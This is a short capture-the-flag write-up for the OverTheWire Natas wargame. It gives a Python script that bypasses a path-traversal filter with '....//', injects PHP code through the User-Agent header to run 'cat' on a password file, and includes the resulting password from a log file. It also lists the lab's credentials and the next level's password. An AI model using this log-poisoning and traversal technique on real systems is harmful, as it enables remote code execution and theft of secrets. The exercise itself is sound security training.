# natas26

```python
import httplib,sys
from base64 import b64encode
from urllib import urlencode

sessid=’whateversessid’
langstr=’….//….//….//….//….//var/www/natas/natas25/logs/natas25_whateversessid.log’
httpClient = None
try:
userAndPass = b64encode(b”natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c”).decode(“ascii”)
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie , ‘User-Agent’ : ‘<? passthru(“cat /etc/natas_webpass/natas26”) ?>’}
httpClient = httplib.HTTPConnection(‘natas25.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘GET’, ‘/index.php?lang=’+langstr, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()
```

“….//” becomes “../” after the first filter
The second filter cannot be passed
Make use of User-Agent to execute code

Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
